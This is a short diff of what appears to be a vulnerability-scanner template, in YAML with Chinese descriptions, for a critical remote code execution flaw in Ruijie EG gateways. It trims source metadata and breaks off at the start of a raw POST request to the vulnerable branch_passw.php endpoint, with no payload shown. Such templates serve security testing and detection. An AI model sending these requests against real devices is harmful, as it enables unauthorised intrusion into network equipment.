@@ -3,13 +3,8 @@ info:
   name: 锐捷EG易网关branch_passw.php远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/3b2b821562fe8e37ab726fb9d716d714
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 3b2b821562fe8e37ab726fb9d716d714
 http:
 - raw:
   - 'POST /itbox_pi/branch_passw.php?a=set HTTP/1.1
